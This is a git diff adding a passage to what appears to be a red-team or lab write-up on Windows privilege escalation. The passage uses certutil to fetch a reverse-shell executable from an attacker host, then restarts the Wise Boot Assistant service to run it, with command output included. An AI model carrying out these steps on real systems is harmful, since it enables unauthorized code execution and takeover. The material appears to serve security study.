@@ -443,5 +443,44 @@ Prepare reverse shell suitable on attacker machine and have it dropped in file l
 
 ![image](https://github.com/user-attachments/assets/3218c247-1e88-48fa-9328-fd39d0e0ed29)
 
+    certutil.exe -urlcache -f http://192.168.64.129:8000/Wisebad.exe Wisebad.exe
+
+![image](https://github.com/user-attachments/assets/5ca87ffd-1b92-4674-be2e-ccace41385a9)
+
+## Begin a new listener and Force restart of Wise services.
+
+Looks like it did not work, therefore renaming the wisebad.exe to simply wise.exe might be required.
+
+![image](https://github.com/user-attachments/assets/aa21e130-7aa3-4364-88eb-fc65fdf6bad3)
+
+Retry:
+
+    c:\Program Files (x86)\Wise>sc stop wisebootassistant
+    sc stop wisebootassistant
+    
+    SERVICE_NAME: wisebootassistant 
+            TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+            STATE              : 3  STOP_PENDING 
+                                    (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+            WIN32_EXIT_CODE    : 0  (0x0)
+            SERVICE_EXIT_CODE  : 0  (0x0)
+            CHECKPOINT         : 0x3
+            WAIT_HINT          : 0x1388
+    
+    c:\Program Files (x86)\Wise>sc start wisebootassistant
+    sc start wisebootassistant
+    [SC] StartService FAILED 1053:
+
+    The service did not respond to the start or control request in a timely fashion.
+
+
+    c:\Program Files (x86)\Wise>
+
+
+Success:
+
+![image](https://github.com/user-attachments/assets/18fa1831-c531-4934-a24e-1d042338753d)
+
+*******
 
 ### RED TEAM - Jenkins exploitation study: https://blog.orange.tw/posts/2019-01-hacking-jenkins-part-1-play-with-dynamic-routing/
